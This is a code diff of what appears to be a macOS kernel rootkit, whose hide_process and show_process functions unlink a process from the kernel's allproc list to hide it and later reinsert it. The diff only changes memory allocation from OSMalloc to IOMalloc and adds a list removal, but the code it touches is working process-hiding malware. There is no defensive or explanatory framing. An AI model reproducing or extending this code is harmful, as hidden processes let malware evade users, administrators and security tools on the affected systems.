@@ -7,7 +7,7 @@
 //
 
 #include <mach/mach_types.h>
-#include <libkern/OSMalloc.h>
+#include <IOKit/IOLib.h>
 #include <mach-o/loader.h>
 #include <mach-o/nlist.h>
 #include <mach/mach_types.h>
@@ -19,8 +19,6 @@
 struct hiddenProc {
 
     struct proc *process;
-    OSMallocTag tag;
-
     LIST_ENTRY(hiddenProc) processes;
 
 };
@@ -72,14 +70,10 @@ hide_process(pid_t pid) {
             proc_list_unlock();
 
             /* Add it to our list */
-            char tagStr[101];
-            snprintf(tagStr, 100, "hiddenProc-%i", process->p_pid);
-            OSMallocTag tag = OSMalloc_Tagalloc(tagStr, OSMT_DEFAULT);
 
-            struct hiddenProc *item = OSMalloc(sizeof(struct hiddenProc), tag);
+            struct hiddenProc *item = IOMalloc(sizeof(struct hiddenProc));
 
             item->process = process;
-            item->tag = tag;
 
             LIST_INSERT_HEAD(&hidden_procs_head, item, processes);
 
@@ -108,7 +102,9 @@ show_process(pid_t pid) {
             proc_list_lock();
             LIST_INSERT_HEAD(allproc, item->process, p_list);
             proc_list_unlock();
-            OSFree(item, sizeof(struct hiddenProc), item->tag);
+            
+            LIST_REMOVE(item, processes);
+            IOFree(item, sizeof(struct hiddenProc));
             return KERN_SUCCESS;
         }
     }
